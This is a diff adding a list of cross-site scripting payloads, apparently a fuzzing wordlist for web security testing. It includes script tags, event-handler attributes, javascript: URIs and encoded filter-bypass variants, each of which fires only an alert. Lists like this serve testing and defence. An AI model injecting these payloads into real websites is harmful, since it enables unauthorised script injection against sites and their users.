@@ -1,0 +1,59 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<iframe src='javascript:alert(1)'></iframe>
+<svg onload=alert('XSS')>
+eval("alert('XSS')")
+javascript:alert('XSS')
+<input onfocus=alert('XSS')>
+<body onload=alert('XSS')>
+<a href='javascript:alert("XSS")'>Click me</a>
+<form onsubmit=alert('XSS')>
+<div onmouseover=alert('XSS')>Hover me</div>
+<textarea onfocus=alert('XSS')></textarea>
+<select onfocus=alert('XSS')><option>Test</option></select>
+<button onclick=alert('XSS')>Click me</button>
+<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>
+<audio src=x onerror=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<script>alert('XSS')</script>
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+<div data-test='" onmouseover=alert(1) x=''></div>
+<iframe src=x onerror=alert('XSS')></iframe>
+<script>alert&#40;'XSS'&#41;</script>
+<body onunload=alert('XSS')>
+<script>document.location='javascript:alert(1)';</script>
+%253Cscript%253Ealert%25281%2529%253C/script%253E
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<b <script>alert(1)</script>0
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
+<embed src="javascript:alert(1)">
+<img src="javascript:alert(1)">
+<image src="javascript:alert(1)">
+<script src="javascript:alert(1)">
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+<? foo=""><script>javascript:alert(1)</script>
+<! foo=""><script>javascript:alert(1)</script>
+</ foo=""><script>javascript:alert(1)</script>
+<body onkeydown="javascript:javascript:alert(1)"></body>
+<iframe onbeforeload="javascript:javascript:alert(1)"></iframe>
+<iframe src="javascript:javascript:alert(1)"></iframe>
+<svg onload="javascript:javascript:alert(1)"></svg>
+<html onmousemove="javascript:javascript:alert(1)"></html>
+<body onblur="javascript:javascript:alert(1)"></body>
+\x3Cscript>javascript:alert(1)</script>
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<script>javascript:alert(1)</script\x0D
+<script>javascript:alert(1)</script\x0A
+<script>javascript:alert(1)</script\x0B
+<script charset="\x22>javascript:alert(1)</script>
+`"'><img src='#\x27 onerror=javascript:alert(1)>
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+'"`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:alert(1)// */</script>
+<script>/* *\x00/javascript:alert(1)// */</script>
